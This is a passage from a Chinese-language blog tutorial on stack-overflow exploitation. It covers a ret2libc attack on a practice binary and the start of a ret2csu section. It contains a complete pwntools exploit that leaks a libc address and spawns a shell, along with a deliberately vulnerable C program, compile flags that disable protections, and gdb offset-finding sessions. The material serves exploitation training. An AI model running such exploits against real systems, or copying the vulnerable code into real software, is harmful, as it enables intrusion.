<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                                       Stack</span><br><span class="line">高地址                               -------------&gt;                             低地址</span><br><span class="line"></span><br><span class="line">|------------------------------|-----------------------|-------------|--------|--------|</span><br><span class="line">|(puts_got addr)+(puts str:No surprise.....appeard QQ.)| _start addr |  AAAAAAAAAAAAA  |</span><br><span class="line">|------------------------------|-----------------------|-------------|--------|--------|</span><br><span class="line">                             args                           EIP          EBP       ESP</span><br><span class="line">结果：</span><br><span class="line">通过pwntools的recv函数接收到当前栈中弹出的puts_got addr的真实地址</span><br></pre></td></tr></table></figure></div>

<p style="color:#27AE60" ;>绿色路线解释：</p>

<p>其实就是常规的栈利用，由于不需要在意进程是否可以继续运行(执行权限已经获取到了)，所以返回地址(ret)直接用4个C覆盖</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                                      Stack</span><br><span class="line">高地址                              -------------&gt;                               低地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                       System Function Stack  </span><br><span class="line">&lt;--------------------------------------------------------------------&gt;</span><br><span class="line">              args                      EIP            EBP&lt;------&gt;ESP</span><br><span class="line">|------------------------------|-----------------------|-------------|--------|--------|</span><br><span class="line">|        &quot;&#x2F;bin&#x2F;sh&quot; addr        |        &quot;CCCC&quot;         | system addr |    BBBBBBBBBBB  |</span><br><span class="line">|------------------------------|-----------------------|-------------|--------|--------|</span><br><span class="line">                                                             EIP         EBP     ESP</span><br><span class="line">                                                       &lt;-------------------------------&gt;</span><br><span class="line">                                                                 Current Stack</span><br><span class="line">结果：</span><br><span class="line">可以执行命令了</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
<h5 id="start-和main-的区别"><a href="#start-和main-的区别" class="headerlink" title="_start()和main()的区别"></a>_start()和main()的区别</h5><p>简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。</p>
<p>我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/22.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/22.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>那么我们就可以编写EXP了，这个EXP就算开启了ASLR的话都是狂野利用的，所以我们这边绕过了<strong>NX</strong>保护和<strong>ASLR</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]puts plt: "</span> + hex(puts_plt))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]puts got: "</span> + hex(puts_got))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]_start addr: "</span> + hex(start_addr))</span><br><span class="line">print( <span class="string">"--"</span> * <span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]sending payload1 to leak libc..."</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got])<span class="comment">#把puts_got地址放到栈中参数位置</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))<span class="comment">#获取到输出的值，里面带有我们放入的puts_got地址</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]leak puts addr: "</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]<span class="comment">#</span></span><br><span class="line">binsh_addr = next(libc.search(<span class="string">b'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]leak libc addr: "</span> + hex(libc.address))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]system addr: "</span> + hex(system_addr))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]binsh addr: "</span> + hex(binsh_addr))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"--"</span> * <span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*]sending payload2 to getshell..."</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">"B"</span> * <span class="number">112</span>, system_addr, <span class="string">"CCCC"</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/23.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201121164703334" class="fancybox"><img alt="image-20201121164703334" title="image-20201121164703334" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/23.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<blockquote>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3></blockquote>
<blockquote>
<p>AMD64和i386的区别</p>
</blockquote>
<p>由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下</p>
<ul>
<li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则就会抛出异常。</li>
<li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、 <strong>R8</strong>和<strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
</ul>
<p>下面用实例讲解下相对的区别，下面是测试代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//level3.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>打开ASLR并用如下方法编译，这里要得是打开Linux的ASLR，而不是进程的PIE</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -no-pie level3.c -o level3</span><br></pre></td></tr></table></figure></div>

<p>首先查看保护</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec level3</span><br><span class="line">[*] <span class="string">'/home/ascotbe/Desktop/Pwn/level3'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></div>

<p>接着查看溢出点</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ gdb ./level3</span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span><br><span class="line">Reading symbols from ./level3...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./level3)     </span><br><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span></span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/ascotbe/Desktop/Pwn/level3 </span><br><span class="line">Hello, World</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xc9 </span><br><span class="line">RBX: 0x555555555200 (&lt;__libc_csu_init&gt;:	endbr64)</span><br><span class="line">RCX: 0x7ffff7ed7142 (&lt;__GI___libc_read+18&gt;:	cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0x200 </span><br><span class="line">RSI: 0x7fffffffdf20 (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>...)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x6c41415041416b41 (<span class="string">'AkAAPAAl'</span>)</span><br><span class="line">RSP: 0x7fffffffdfa8 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">RIP: 0x5555555551c4 (&lt;vulnerable_function+36&gt;:	ret)</span><br><span class="line">R8 : 0x0 </span><br><span class="line">R9 : 0x7ffff7fe0d50 (endbr64)</span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x5555555550a0 (&lt;_start&gt;:	endbr64)</span><br><span class="line">R13: 0x7fffffffe0b0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10207 (CARRY PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555555551bd &lt;vulnerable_function+29&gt;:	call   0x555555555090 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">   0x5555555551c2 &lt;vulnerable_function+34&gt;:	nop</span><br><span class="line">   0x5555555551c3 &lt;vulnerable_function+35&gt;:	leave  </span><br><span class="line">=&gt; 0x5555555551c4 &lt;vulnerable_function+36&gt;:	ret    </span><br><span class="line">   0x5555555551c5 &lt;main&gt;:	endbr64 </span><br><span class="line">   0x5555555551c9 &lt;main+4&gt;:	push   rbp</span><br><span class="line">   0x5555555551ca &lt;main+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x5555555551cd &lt;main+8&gt;:	sub    rsp,0x10</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdfa8 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0008| 0x7fffffffdfb0 (<span class="string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0016| 0x7fffffffdfb8 (<span class="string">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0024| 0x7fffffffdfc0 (<span class="string">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0032| 0x7fffffffdfc8 (<span class="string">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0040| 0x7fffffffdfd0 (<span class="string">"AuAAXAAvAAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0048| 0x7fffffffdfd8 (<span class="string">"AAYAAwAAZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">0056| 0x7fffffffdfe0 (<span class="string">"ZAAxAAyA\nQUUUU"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x00005555555551c4 <span class="keyword">in</span> vulnerable_function ()</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到溢出值变成<code>vulnerable_function()</code>函数，而PC指针并没有指向类似于<code>0x41414141</code>那样的地址，主要原因是上面我们提到的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。虽然PC不能跳转到那个地址，但是还是可以通过栈来计算溢出点。因为ret相当于<strong>pop rip</strong>指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash">  x/gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdfa8:	0x41416d4141514141</span><br></pre></td></tr></table></figure></div>

<p>并且可以计算出溢出位置</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern offset 0x41416d4141514141</span><br><span class="line">4702159612987654465 found at offset: 136</span><br></pre></td></tr></table></figure></div>

<p>知道溢出位置，我们在生成一个溢出字符串来看下是否能够控制EIP指针</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ python3 -c <span class="string">'print("A"*136+"ABCDEF\x00\x00")'</span> &gt;payload</span><br><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ gdb ./level3 </span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span><br><span class="line">Reading symbols from ./level3...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./level3)</span><br><span class="line">gdb-peda$ run &lt; payload </span><br><span class="line">Starting program: /home/ascotbe/Desktop/Pwn/level3 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x91 </span><br><span class="line">RBX: 0x555555555200 (&lt;__libc_csu_init&gt;:	endbr64)</span><br><span class="line">RCX: 0x7ffff7ed7142 (&lt;__GI___libc_read+18&gt;:	cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0x200 </span><br><span class="line">RSI: 0x7fffffffdf20 (<span class="string">'A'</span> &lt;repeats 137 <span class="built_in">times</span>&gt;, <span class="string">"BCDEF"</span>)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x4141414141414141 (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">RSP: 0x7fffffffdfb0 --&gt; 0x7fffffffe00a --&gt; 0x7fffffff </span><br><span class="line">RIP: 0x464544434241 (<span class="string">'ABCDEF'</span>)</span><br><span class="line">R8 : 0x0 </span><br><span class="line">R9 : 0x7ffff7fe0d50 (endbr64)</span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x5555555550a0 (&lt;_start&gt;:	endbr64)</span><br><span class="line">R13: 0x7fffffffe0b0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10203 (CARRY parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x464544434241</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdfb0 --&gt; 0x7fffffffe00a --&gt; 0x7fffffff </span><br><span class="line">0008| 0x7fffffffdfb8 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdfc0 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdfc8 --&gt; 0x7ffff7ded0b3 (&lt;__libc_start_main+243&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7fffffffdfd0 --&gt; 0x7ffff7ffc620 --&gt; 0x5044100000000 </span><br><span class="line">0040| 0x7fffffffdfd8 --&gt; 0x7fffffffe0b8 --&gt; 0x7fffffffe3d1 (<span class="string">"/home/ascotbe/Desktop/Pwn/level3"</span>)</span><br><span class="line">0048| 0x7fffffffdfe0 --&gt; 0x100000000 </span><br><span class="line">0056| 0x7fffffffdfe8 --&gt; 0x5555555551c5 (&lt;main&gt;:	endbr64)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000464544434241 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure></div>

<p>可以看到地址变成了<code>0x0000464544434241</code>，这个值就是我们上面生成的<strong>ABCDEF\x00\x00</strong>小端字节序排列的，既然验证了我们的猜想，那么就可以写EXP</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;c90530c910b0</span><br><span class="line">https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2019&#x2F;03&#x2F;05&#x2F;%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc</span><br></pre></td></tr></table></figure></div>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/2020/11/20/StackOverflow_0x02/">https://www.ascotbe.com/2020/11/20/StackOverflow_0x02/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/118.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/12/06/ExecutableLinkableFormat/"><img class="prev_cover lazyload" data-src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/119.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>Linux ELF格式解析</span></div></a></div><div class="next-post pull_right"><a href="/2020/11/19/StackOverflow_0x01/"><img class="next_cover lazyload" data-src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/117.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>栈溢出总结（0x01）</span></div></a></div></nav></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2021 By ascotbe</div><span>呐呐呐ฅ(๑*д*๑)ฅ到底啦~</span><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>闽ICP备20002178号-1</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script 